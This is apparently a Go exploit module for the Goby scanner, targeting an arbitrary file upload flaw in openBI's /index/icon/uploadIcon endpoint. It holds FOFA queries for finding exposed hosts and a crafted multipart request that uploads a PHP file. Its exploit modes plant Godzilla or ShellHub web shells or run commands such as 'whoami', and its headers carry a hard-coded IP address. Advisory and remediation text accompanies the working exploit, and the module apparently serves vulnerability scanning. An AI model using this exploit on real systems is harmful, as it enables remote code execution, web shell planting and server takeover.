package exploits

import (
  "git.gobies.org/goby/goscanner/goutils"
)

func init() {
  expJson := `{
    "Name": "openBI /index/icon/uploadIcon File Upload Vulnerability",
    "Description": "<p>openBI is an open-source business intelligence tool. This vulnerability exists in the /index/icon/uploadIcon interface, allowing attackers to upload specially crafted PHP files to execute malicious code, achieve remote control of the server, and potentially cause serious consequences such as sensitive information leakage and data tampering.</p>",
    "Product": "openBI",
    "Homepage": "https://github.com/openBI-kwc/openBI",
    "DisclosureDate": "2024-12-20",
    "PostTime": "2024-12-20",
    "Author": "2826161446@qq.com",
    "FofaQuery": "body=\"content=\\\"大数据可视化\\\"\" && body=\"数维可视化平台\" || body=\"北京格胜科技有限公司\"",
    "GobyQuery": "body=\"content=\\\"大数据可视化\\\"\" && body=\"数维可视化平台\" || body=\"北京格胜科技有限公司\"",
    "Level": "2",
    "Impact": "<p>This vulnerability allows attackers to upload and execute arbitrary files on the affected server, potentially leading to complete server control, data leakage, and system crashes.</p>",
    "Recommendation": "<p>It is recommended to immediately fix the file upload functionality, strictly restrict the type and content of uploaded files, and prohibit the upload of executable script files. Additionally, it is recommended to control permissions for the file upload path and use security measures such as WAF (Web Application Firewall) to prevent malicious requests.</p>",
    "References": [
        "https://www.sxxdckj.com/cms/a/openBI-Icon-php-wen-jian-cun-zai-ren-yi-wen-jian-shang-chuan-lou-dong.html"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "Mode",
            "type": "select",
            "value": "ShellHub,Godzilla,Command,Customize",
            "show": ""
        },
        {
            "name": "Command",
            "type": "input",
            "value": "whoami",
            "show": "Mode=Command"
        },
        {
            "name": "Content",
            "type": "input",
            "value": "input your content",
            "show": "Mode=Customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/index/icon/uploadIcon",
                "follow_redirect": true,
                "header": {
                    "Accept": "application/json, text/plain, */*",
                    "Origin": "http://83.229.126.236",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
                    "Referer": "http://83.229.126.236/openv/",
                    "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryzTYR3G0WUT9piHU3"
                },
                "data_type": "text",
                "data": "------WebKitFormBoundaryzTYR3G0WUT9piHU3\r\nContent-Disposition: form-data; name=\"image\"; filename=\"{{{FILENAME}}}\"\r\nContent-Type: image/png\r\n\r\n{{{CONTENT}}}\r\n------WebKitFormBoundaryzTYR3G0WUT9piHU3--"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "FILE_PATH|lastbody|regex|\"url\":\"(\\\\\\/[^\\\"]+\\.\\w+)\"",
                "FILE_PATH|FILE_PATH|replace_str|\\/|/"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Upload",
        "2H1W"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "6.7",
    "Translation": {
        "CN": {
            "Name": "openBI /index/icon/uploadIcon 文件上传漏洞",
            "Product": "openBI",
            "Description": "<p>openBI 是一款开源的商业智能工具。该漏洞存在于 /index/icon/uploadIcon 接口中，攻击者可以通过上传特制的 PHP 文件，执行恶意代码，实现服务器的远程控制，可能导致敏感信息泄露、数据篡改等严重后果。</p>",
            "Recommendation": "<p>建议立即修复文件上传功能，严格限制上传文件的类型和内容，禁止上传可执行脚本文件。同时，建议对文件上传路径进行权限控制，并使用WAF（Web应用防火墙）等安全措施防止恶意请求。</p>",
            "Impact": "<p>该漏洞允许攻击者在受影响的服务器上上传并执行任意文件，可能导致服务器被完全控制，数据泄露和系统崩溃等严重后果。</p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传",
                "两高一弱"
            ]
        },
        "EN": {
            "Name": "openBI /index/icon/uploadIcon File Upload Vulnerability",
            "Product": "openBI",
            "Description": "<p>openBI is an open-source business intelligence tool. This vulnerability exists in the /index/icon/uploadIcon interface, allowing attackers to upload specially crafted PHP files to execute malicious code, achieve remote control of the server, and potentially cause serious consequences such as sensitive information leakage and data tampering.</p>",
            "Recommendation": "<p>It is recommended to immediately fix the file upload functionality, strictly restrict the type and content of uploaded files, and prohibit the upload of executable script files. Additionally, it is recommended to control permissions for the file upload path and use security measures such as WAF (Web Application Firewall) to prevent malicious requests.</p>",
            "Impact": "<p>This vulnerability allows attackers to upload and execute arbitrary files on the affected server, potentially leading to complete server control, data leakage, and system crashes.</p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload",
                "2H1W"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": [
            "openBI"
        ],
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {
        "TEMPLATE": "define|variable|FileUpload",
        "SCRIPT_TYPE": "define|variable|php",
        "VUL_URL": "define|variable|/index/icon/uploadIcon"
    },
    "VariablesOrder": [
        "TEMPLATE",
        "SCRIPT_TYPE",
        "VUL_URL"
    ],
    "EditType": "fast",
    "PocId": "9980"
}`

  ExpManager.AddExploit(NewExploit(
    goutils.GetFileName(),
    expJson,
    nil,
    nil,
  ))
}
